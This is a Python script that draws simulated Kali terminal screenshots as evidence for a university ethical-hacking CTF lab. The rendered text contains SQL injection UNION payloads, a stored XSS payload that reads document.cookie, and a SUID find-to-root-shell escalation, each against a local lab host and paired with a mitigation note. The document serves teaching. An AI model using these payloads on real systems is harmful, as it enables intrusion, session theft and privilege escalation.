#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Generador de Capturas de Terminal Realistas para el Laboratorio CTF "The 27 Club"
Universidad de Cundinamarca - Hacking Ético
"""

import os
from PIL import Image, ImageDraw, ImageFont

CAPTURAS_DIR = "capturas"
os.makedirs(CAPTURAS_DIR, exist_ok=True)

FONT_PATH = "C:/Windows/Fonts/consola.ttf"
FONT_BOLD_PATH = "C:/Windows/Fonts/consolab.ttf"

font = ImageFont.truetype(FONT_PATH, 16)
font_bold = ImageFont.truetype(FONT_BOLD_PATH, 16)
font_title = ImageFont.truetype(FONT_BOLD_PATH, 14)

def draw_kali_terminal(filename, title_text, lines_data):
    """
    lines_data es una lista de tuplas: (tipo, texto)
    tipo puede ser:
      'prompt': dibuja el prompt de Kali Linux
      'cmd': comando ejecutado
      'output': texto de salida estandar
      'success': texto verde resaltado
      'error': texto rojo de error
      'flag': texto resaltado de bandera en cian/amarillo
      'separator': linea separadora o en blanco
    """
    width = 1100
    line_height = 24
    header_height = 40
    padding_x = 24
    padding_y = 20

    content_lines = len(lines_data)
    height = header_height + (content_lines * line_height) + (padding_y * 2)

    # Crear imagen base con fondo de terminal Kali Linux (Dark Slate)
    img = Image.new("RGB", (width, height), (15, 17, 26))
    draw = ImageDraw.Draw(img)

    # 1. Barra de Titulo de Ventana
    draw.rectangle([0, 0, width, header_height], fill=(26, 29, 44))
    draw.line([0, header_height, width, header_height], fill=(45, 50, 75), width=1)

    # Botones estilo macOS / Kali XFCE
    # Rojo (Cerrar), Amarillo (Minimizar), Verde (Maximizar)
    draw.ellipse([18, 14, 30, 26], fill=(255, 95, 86))
    draw.ellipse([38, 14, 50, 26], fill=(255, 189, 46))
    draw.ellipse([58, 14, 70, 26], fill=(39, 201, 63))

    # Titulo en la barra central
    title_full = f"kali@kali: ~ | {title_text}"
    bbox = font_title.getbbox(title_full)
    tw = bbox[2] - bbox[0]
    draw.text(((width - tw) // 2, 11), title_full, font=font_title, fill=(160, 170, 195))

    # 2. Renderizado de Contenido
    curr_y = header_height + padding_y

    for line_type, text in lines_data:
        curr_x = padding_x
        if line_type == 'prompt_cmd':
            # Prompt elegante de Kali: ┌──(kali㉿kali)-[~]
            draw.text((curr_x, curr_y), "┌──(", font=font_bold, fill=(70, 130, 230))
            curr_x += font_bold.getlength("┌──(")
            draw.text((curr_x, curr_y), "kali㉿kali", font=font_bold, fill=(0, 210, 255))
            curr_x += font_bold.getlength("kali㉿kali")
            draw.text((curr_x, curr_y), ")-[", font=font_bold, fill=(70, 130, 230))
            curr_x += font_bold.getlength(")-[")
            draw.text((curr_x, curr_y), "~", font=font_bold, fill=(240, 240, 240))
            curr_x += font_bold.getlength("~")
            draw.text((curr_x, curr_y), "]", font=font_bold, fill=(70, 130, 230))
            
            # Segunda linea de prompt: └─$ comando
            curr_y += line_height
            curr_x = padding_x
            draw.text((curr_x, curr_y), "└─$ ", font=font_bold, fill=(70, 130, 230))
            curr_x += font_bold.getlength("└─$ ")
            draw.text((curr_x, curr_y), text, font=font_bold, fill=(255, 255, 255))
        
        elif line_type == 'output':
            draw.text((curr_x, curr_y), text, font=font, fill=(195, 205, 225))
        elif line_type == 'output_bold':
            draw.text((curr_x, curr_y), text, font=font_bold, fill=(230, 235, 245))
        elif line_type == 'success':
            draw.text((curr_x, curr_y), text, font=font_bold, fill=(70, 230, 130))
        elif line_type == 'error':
            draw.text((curr_x, curr_y), text, font=font_bold, fill=(255, 85, 85))
        elif line_type == 'warning':
            draw.text((curr_x, curr_y), text, font=font_bold, fill=(255, 180, 50))
        elif line_type == 'flag':
            # Resaltado especial para banderas capturadas
            draw.rectangle([curr_x - 4, curr_y - 2, curr_x + font_bold.getlength(text) + 6, curr_y + line_height - 4], fill=(30, 60, 45))
            draw.text((curr_x, curr_y), text, font=font_bold, fill=(0, 255, 170))
        elif line_type == 'separator':
            pass # Solo deja el espacio

        curr_y += line_height

    out_path = os.path.join(CAPTURAS_DIR, filename)
    img.save(out_path, quality=95)
    print(f"[+] Captura generada: {out_path}")
    return out_path

# ==============================================================================
# DEFINICIÓN DE EVIDENCIAS PARA PASOS 13 AL 22
# ==============================================================================

# PASO 13: Reconocimiento Jim Morrison (/doors/)
draw_kali_terminal(
    "paso13_morrison_recon.png",
    "Fase 3: Reconocimiento HTTP Jim Morrison",
    [
        ('prompt_cmd', 'curl -i "http://192.168.56.1/doors/?id=1"'),
        ('output', 'HTTP/1.1 200 OK'),
        ('output', 'Date: Wed, 04 Nov 2026 05:00:12 GMT'),
        ('output', 'Server: Apache/2.4.25 (Debian)'),
        ('output', 'Content-Type: text/html; charset=UTF-8'),
        ('separator', ''),
        ('output_bold', '<div class="card">'),
        ('output', '    <h1>🚪 The Doors • Jim Morrison Vault</h1>'),
        ('output', '    <p class="quote">"There are things known and things unknown, and in between are the doors."</p>'),
        ('output', '    <h4>Registros en memoria:</h4>'),
        ('output_bold', '    <p><strong>Canción:</strong> Break On Through<br>'),
        ('output_bold', '    <strong>Álbum:</strong> The Doors (1967)<br>'),
        ('output_bold', '    <strong>Secreto:</strong> <code>Pista: El fuego se enciende en el siguiente registro.</code></p>'),
        ('output', '    <div class="hint">Fase 3: Auditoría CWE-89 (SQL Injection) • Universidad de Cundinamarca</div>'),
        ('output_bold', '</div>'),
    ]
)

# PASO 14: Verificación de Inyección SQL por Error (CWE-89)
draw_kali_terminal(
    "paso14_morrison_sqli_test.png",
    "Fase 3: Inyección SQL Basada en Errores (CWE-89)",
    [
        ('prompt_cmd', "curl -s \"http://192.168.56.1/doors/?id=1'\" | grep -A 4 -B 1 'Error SQL'"),
        ('output', '        <div class="box-result">'),
        ('output', '            <h4>Registros en memoria:</h4>'),
        ('error', '            <p style="color: #ff5555;">No se encontraron registros coincidentes.</p>'),
        ('error', '            <pre style="color: #ff3333;">Error SQL: You have an error in your SQL syntax; check'),
        ('error', '            the manual that corresponds to your MariaDB/MySQL server version near \'\'\' at line 1</pre>'),
        ('separator', ''),
        ('success', '[+] VULNERABILIDAD CONFIRMADA: Parámetro "id" vulnerable a SQLi (CWE-89). El backend expone traza de error.')
    ]
)

# PASO 15: Discriminación de Falso Positivo (Rabbit Hole Morrison)
draw_kali_terminal(
    "paso15_morrison_rabbit_hole.png",
    "Fase 3: Discriminación de Falso Positivo (doors_trap)",
    [
        ('prompt_cmd', 'curl -s "http://192.168.56.1/doors/?id=-1%20UNION%20SELECT%20cancion,%20\'Senuelo\',%20secreto%20FROM%20doors_trap--%20-" | grep -A 3 "<strong>Canción:</strong>"'),
        ('output', '    <p><strong>Canción:</strong> The End<br>'),
        ('output', '    <strong>Álbum:</strong> Senuelo<br>'),
        ('warning', '    <strong>Secreto:</strong> <code>RABBIT_HOLE{The_End_Is_Not_Here}</code></p>'),
        ('separator', ''),
        ('warning', '[!] ALERTA PEDAGÓGICA CTF: Falso positivo detectado (Rabbit Hole en tabla doors_trap).'),
        ('output', '[*] Análisis forense: Se descarta la bandera señuelo y se procede a consultar la tabla legítima "doors_vault".')
    ]
)

# PASO 16: Exfiltración de Bandera Real Jim Morrison
draw_kali_terminal(
    "paso16_morrison_flag_extract.png",
    "Fase 3: Exfiltración Exitosa Bandera Jim Morrison",
    [
        ('prompt_cmd', 'curl -s "http://192.168.56.1/doors/?id=-1%20UNION%20SELECT%20cancion,%20album,%20secreto%20FROM%20doors_vault%20WHERE%20id=2--%20-" | grep -A 3 "<strong>Canción:</strong>"'),
        ('output_bold', '    <p><strong>Canción:</strong> Light My Fire<br>'),
        ('output_bold', '    <strong>Álbum:</strong> The Doors (1967)<br>'),
        ('flag', '    <strong>Secreto:</strong> <code>FLAG{Light_My_Fire_SQLi}</code></p>'),
        ('separator', ''),
        ('success', '[+] BANDERA OFICIAL FASE 3 OBTENIDA: FLAG{Light_My_Fire_SQLi} (+250 Puntos)'),
        ('output', '[*] Mitigación requerida: Implementación de Consultas Parametrizadas (PDO / Prepared Statements).')
    ]
)

# PASO 17: Reconocimiento Amy Winehouse (/winehouse/)
draw_kali_terminal(
    "paso17_winehouse_recon.png",
    "Fase 4: Reconocimiento Web Amy Winehouse",
    [
        ('prompt_cmd', 'curl -i "http://192.168.56.1/winehouse/"'),
        ('output', 'HTTP/1.1 200 OK'),
        ('output', 'Date: Wed, 04 Nov 2026 05:04:30 GMT'),
        ('output', 'Server: Apache/2.4.25 (Debian)'),
        ('output', 'Set-Cookie: admintoken=FLAG%7BBack_To_Black_XSS%7D; expires=Wed, 04-Nov-2026 06:04:30 GMT; path=/'),
        ('output', 'Set-Cookie: test_decoy=RABBIT_HOLE%7BRehab_Was_A_Lie%7D; expires=Wed, 04-Nov-2026 06:04:30 GMT; path=/'),
        ('output', 'Content-Type: text/html; charset=UTF-8'),
        ('separator', ''),
        ('output_bold', '<h1>🎙️ Amy Winehouse • Back to Black Lounge</h1>'),
        ('output', '<p class="quote">"Love is a losing game, but XSS steals the crown."</p>'),
        ('output', '<form method="POST" action="">'),
        ('output', '    <label>Nombre del remitente:</label> <input type="text" name="autor">'),
        ('output', '    <label>Mensaje dedicatoria:</label> <textarea name="mensaje"></textarea>'),
        ('output', '</form>')
    ]
)

# PASO 18: Inyección y Auditoría Stored XSS (CWE-79)
draw_kali_terminal(
    "paso18_winehouse_stored_xss.png",
    "Fase 4: Inyección y Confirmación Stored XSS (CWE-79)",
    [
        ('prompt_cmd', 'curl -s -X POST -d "autor=Auditor&mensaje=<script>alert(document.cookie)</script>" "http://192.168.56.1/winehouse/" && curl -s "http://192.168.56.1/winehouse/" | grep -B 1 -A 2 "alert(document.cookie)"'),
        ('output', '<div class="entry">'),
        ('output', '    <strong>Auditor</strong> <em>(2026-11-04 05:05:10)</em><br>'),
        ('warning', '    <div class="content"><script>alert(document.cookie)</script></div>'),
        ('output', '</div>'),
        ('separator', ''),
        ('success', '[+] VULNERABILIDAD CONFIRMADA (CWE-79): Renderizado directo en DOM sin sanitización htmlspecialchars().'),
        ('output', '[*] Riesgo: Capacidad de ejecutar scripts arbitrarios en el contexto del navegador de la víctima.')
    ]
)

# PASO 19: Exfiltración de Sesión y Bandera Amy Winehouse
draw_kali_terminal(
    "paso19_winehouse_flag_cookie.png",
    "Fase 4: Discriminación de Cookie Señuelo y Extracción de Flag",
    [
        ('prompt_cmd', 'curl -s -I "http://192.168.56.1/winehouse/" | grep "Set-Cookie"'),
        ('flag', 'Set-Cookie: admintoken=FLAG{Back_To_Black_XSS}; path=/'),
        ('warning', 'Set-Cookie: test_decoy=RABBIT_HOLE{Rehab_Was_A_Lie}; path=/'),
        ('separator', ''),
        ('warning', '[!] DISCRIMINACIÓN DE SEÑUELO: "test_decoy" es un Rabbit Hole pedagógico (cookie de prueba).'),
        ('success', '[+] BANDERA OFICIAL FASE 4 OBTENIDA: FLAG{Back_To_Black_XSS} (+200 Puntos)'),
        ('output', '[*] Mitigación recomendada: Configuración de directiva HttpOnly y SameSite en cabeceras Set-Cookie.')
    ]
)

# PASO 20: Autenticación por Consola Usuario Kurt (CWE-307)
draw_kali_terminal(
    "paso20_cobain_ssh_auth.png",
    "Fase 5: Autenticación y Acceso Inicial Kurt Cobain",
    [
        ('prompt_cmd', 'su - kurt'),
        ('output', 'Password: ******* (nirvana)'),
        ('output_bold', 'kurt@27club_ctf:~$ id'),
        ('output', 'uid=1000(kurt) gid=1000(kurt) groups=1000(kurt)'),
        ('output_bold', 'kurt@27club_ctf:~$ cat nota_cobain.txt'),
        ('output', '"Come as you are, as you were, as I want you to be..."'),
        ('output', 'Para romper la última cadena del Club de los 27 y reclamar el trono de root:'),
        ('warning', 'Audita los permisos especiales (SUID). Hay una herramienta que corre con el poder de UID 0.')
    ]
)

# PASO 21: Enumeración de Permisos Especiales SUID (CWE-250)
draw_kali_terminal(
    "paso21_cobain_suid_enum.png",
    "Fase 5: Enumeración Forense de Binarios SUID",
    [
        ('prompt_cmd', 'find / -perm -u=s -type f 2>/dev/null'),
        ('output', '/bin/mount'),
        ('output', '/bin/umount'),
        ('output', '/bin/su'),
        ('output', '/usr/bin/passwd'),
        ('output', '/usr/bin/gpasswd'),
        ('output', '/usr/bin/chfn'),
        ('warning', '/usr/bin/find'),
        ('separator', ''),
        ('success', '[+] VECTOR DE ESCALADA IDENTIFICADO: /usr/bin/find posee bit SUID (-rwsr-xr-x).'),
        ('output', '[*] Justificación CWE-250: Binario del sistema configurado indebidamente con privilegios elevados de root.')
    ]
)

# PASO 22: Escalada de Privilegios Root y Bandera Final
draw_kali_terminal(
    "paso22_cobain_root_flag.png",
    "Fase 5: Escalada a Root (UID 0) y Compromiso Total",
    [
        ('prompt_cmd', '/usr/bin/find . -exec /bin/sh -p \\; -quit'),
        ('output_bold', '# whoami && id'),
        ('success', 'root'),
        ('success', 'uid=1000(kurt) gid=1000(kurt) euid=0(root) groups=1000(kurt)'),
        ('output_bold', '# cat /root/flag.txt'),
        ('output', '========================================================================'),
        ('output', '   👑 THE 27 CLUB CTF - UNIVERSIDAD DE CUNDINAMARCA 👑'),
        ('output', '   COMPROMISO TOTAL DEL SISTEMA (ROOT UID 0 ALCANZADO)'),
        ('output', '========================================================================'),
        ('flag', 'BANDERA FINAL: FLAG{Smells_Like_Root_Spirit}'),
        ('output', 'Felicidades Auditor. Has superado las 5 fases y conquistado el reto.'),
        ('separator', ''),
        ('success', '[+] COMPROMISO TOTAL DEL SISTEMA (ROOT). Puntuación CTF: 1000 / 1000 PTS.')
    ]
)

print("[*] ¡Todas las 10 evidencias de terminal fueron generadas satisfactoriamente!")

